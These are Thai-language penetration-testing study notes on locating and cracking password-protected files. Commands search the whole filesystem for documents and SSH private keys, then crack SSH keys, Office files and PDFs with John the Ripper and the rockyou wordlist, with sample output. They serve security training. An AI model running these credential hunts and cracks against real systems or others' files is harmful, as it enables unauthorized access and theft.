# การถอดรหัสไฟล์ที่มีการป้องกัน (Cracking Protected Files)

## ภาพรวม

การเข้ารหัสไฟล์ยังคงถูกละเลยทั้งในบริบทส่วนตัวและการทำงาน อีเมลที่มีข้อมูลสำคัญ เช่น ใบสมัครงาน, บัญชีเงิน, หรือสัญญา มักถูกส่งโดยไม่มีการเข้ารหัส ซึ่งอาจละเมิดกฎหมาย

### กฎหมายที่เกี่ยวข้อง
- **GDPR (General Data Protection Regulation)** ในสหภาพยุโรป กำหนดให้ข้อมูลส่วนบุคคลต้องถูกเข้ารหัสทั้ง:
  - **In transit** (ขณะส่ง)
  - **At rest** (ขณะจัดเก็บ)

## ประเภทการเข้ารหัส

### 1. **Symmetric Encryption (การเข้ารหัสแบบสมมาตร)**
- ใช้สำหรับจัดเก็บไฟล์หรือโฟลเดอร์
- อัลกอริทึมยอดนิยม: **AES-256**
- ใช้คีย์เดียวกันทั้งการเข้ารหัสและถอดรหัส

### 2. **Asymmetric Encryption (การเข้ารหัสแบบอสมมาตร)**
- ใช้สำหรับส่งไฟล์
- ใช้คีย์ 2 ตัว:
  - **Public Key**: ผู้ส่งใช้เข้ารหัส
  - **Private Key**: ผู้รับใช้ถอดรหัส

## การค้นหาไฟล์ที่เข้ารหัส

### คำสั่งค้นหาไฟล์ที่เข้ารหัสทั่วไป

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### ผลลัพธ์ตัวอย่าง

```
File extension:  .xls
File extension:  .xls*
File extension:  .xltx
File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
```

**หมายเหตุ:** ถ้าเจอ file extension ที่ไม่รู้จัก ให้ใช้ search engine ค้นหา สามารถดูรายการที่ FileInfo

## การค้นหา SSH Keys

### ลักษณะของ SSH Private Key
- **ไม่มี** file extension มาตรฐาน
- เริ่มต้นด้วย: `-----BEGIN [...] PRIVATE KEY-----`

### คำสั่งค้นหา SSH Keys

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

### ผลลัพธ์ตัวอย่าง

```
/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

## การตรวจสอบว่า SSH Key มีการเข้ารหัสหรือไม่

### SSH Key แบบเก่า (PEM Format)
ดูได้จาก header ที่บอกวิธีการเข้ารหัส:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
```

### SSH Key สมัยใหม่
ดูไม่ออกจาก header ต้องใช้คำสั่ง:

```bash
ssh-keygen -yf ~/.ssh/id_ed25519
```

**ถ้าไม่มีรหัสผ่าน:** จะแสดง public key ทันที
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
```

**ถ้ามีรหัสผ่าน:** จะขอ passphrase
```bash
ssh-keygen -yf ~/.ssh/id_rsa
Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```

## การถอดรหัส SSH Keys

### ค้นหา John the Ripper Scripts

```bash
locate *2john*
```

### รายการ Scripts ที่มีให้

```
/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/keepass2john
/usr/bin/rar2john
/usr/bin/zip2john
/usr/share/john/ssh2john.py
/usr/share/john/office2john.py
/usr/share/john/pdf2john.py
```

### ขั้นตอนการ Crack SSH Key

#### 1. แปลง SSH Key เป็น Hash

```bash
ssh2john.py SSH.private > ssh.hash
```

#### 2. ใช้ John the Ripper Crack

```bash
john --wordlist=rockyou.txt ssh.hash
```

#### 3. ดูผลลัพธ์

```bash
john ssh.hash --show
```

**ผลลัพธ์:**
```
SSH.private:1234

1 password hash cracked, 0 left
```

## การถอดรหัสเอกสาร Microsoft Office

### ขั้นตอนการ Crack

#### 1. แปลงเอกสารเป็น Hash

```bash
office2john.py Protected.docx > protected-docx.hash
```

#### 2. Crack ด้วย John the Ripper

```bash
john --wordlist=rockyou.txt protected-docx.hash
```

#### 3. ดูผลลัพธ์

```bash
john protected-docx.hash --show
```

**ผลลัพธ์:**
```
Protected.docx:1234

1 password hash cracked, 0 left
```

## การถอดรหัสไฟล์ PDF

### ขั้นตอนเหมือนกับ Office แต่ใช้ Script ต่างกัน

#### 1. แปลง PDF เป็น Hash

```bash
pdf2john.py PDF.pdf > pdf.hash
```

#### 2. Crack ด้วย John the Ripper

```bash
john --wordlist=rockyou.txt pdf.hash
```

#### 3. ดูผลลัพธ์

```bash
john pdf.hash --show
```

**ผลลัพธ์:**
```
PDF.pdf:1234

1 password hash cracked, 0 left
```

## ความท้าทายในการ Crack ไฟล์

### ปัญหาหลัก

1. **การสร้าง Password Lists ที่มีประสิทธิภาพ**
   - Password list มาตรฐานอาจไม่เพียงพอ
   - ถูกบล็อกโดยระบบรักษาความปลอดภัย

2. **รหัสผ่านที่ซับซ้อนขึ้น**
   - ผู้ใช้ถูกบังคับให้ใช้รหัสผ่านยาวขึ้น
   - สุ่มมากขึ้น หรือเป็น complex passphrases
   - อาจใช้เวลานานมากหรือถอดไม่ได้เลย

### ทำไมยังคุ้มค่าที่จะลอง

แม้จะยาก แต่เอกสารที่มีการป้องกันมักมีข้อมูลสำคัญที่สามารถ:
- ใช้เข้าถึงระบบเพิ่มเติมได้
- มีข้อมูล credentials อื่นๆ
- เป็นประโยชน์ในการยกระดับการโจมตี

